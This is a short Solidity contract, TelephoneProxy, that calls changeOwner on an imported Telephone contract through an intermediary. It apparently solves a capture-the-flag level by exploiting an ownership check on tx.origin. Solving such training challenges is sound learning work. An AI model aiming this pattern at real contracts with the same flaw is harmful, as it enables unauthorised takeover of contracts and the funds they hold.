// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Telephone.sol";

contract TelephoneProxy {
    Telephone public instance;
    address public owner;

    constructor(address _instanceAddr) {
        owner = msg.sender;
        instance = Telephone(_instanceAddr);
    }

    function call() public {
        instance.changeOwner(owner);
    }
}